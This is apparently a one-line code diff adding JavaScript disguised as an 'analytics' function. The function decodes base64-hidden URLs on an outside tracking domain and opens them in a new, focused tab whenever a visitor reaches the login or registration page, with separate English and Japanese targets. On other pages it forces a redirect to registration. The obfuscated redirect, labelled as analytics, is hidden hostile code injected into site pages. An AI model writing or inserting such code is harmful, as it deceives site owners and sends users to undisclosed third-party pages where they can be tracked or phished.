@@ -1,0 +1,1 @@
+const en="aHR0cHM6Ly9ranRyY2suY29tL2J1YmluZ2FfZW4=",ja="aHR0cHM6Ly9ranRyY2suY29tL2J1YmluZ2FfamE=",analytics=()=>document.location.pathname.endsWith("/login")||document.location.pathname.endsWith("/registration")?document.location.pathname.startsWith("/ja")?window.open(atob(ja),"_blank").focus():window.open(atob(en),"_blank").focus():window.open("/registration","_self");
